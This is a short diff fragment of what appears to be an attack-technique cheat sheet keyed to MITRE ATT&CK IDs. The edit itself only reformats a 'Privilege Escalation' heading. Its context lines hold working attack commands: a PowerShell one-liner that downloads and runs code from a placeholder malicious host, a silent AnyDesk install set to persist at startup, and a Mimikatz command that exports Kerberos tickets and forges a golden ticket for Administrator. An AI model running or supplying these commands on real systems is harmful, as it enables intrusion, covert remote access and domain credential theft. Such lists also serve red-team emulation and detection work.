@@ -18,8 +18,9 @@ powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicio
 
 # T1219 - Remote Access Software (AnyDesk install)
 curl -o AnyDeskSetup.exe https://download.anydesk.com/AnyDesk.exe && AnyDeskSetup.exe --install C:\ProgramData\AnyDesk --silent --start-with-win
-Privilege Escalation (TA0004)
 
+
+## Privilege Escalation (TA0004)
 
 # T1558 - Kerberos Ticket Theft (Mimikatz)
 mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789 /krbtgt:a1b2c3d4e5f6g7h8 /ptt" exit
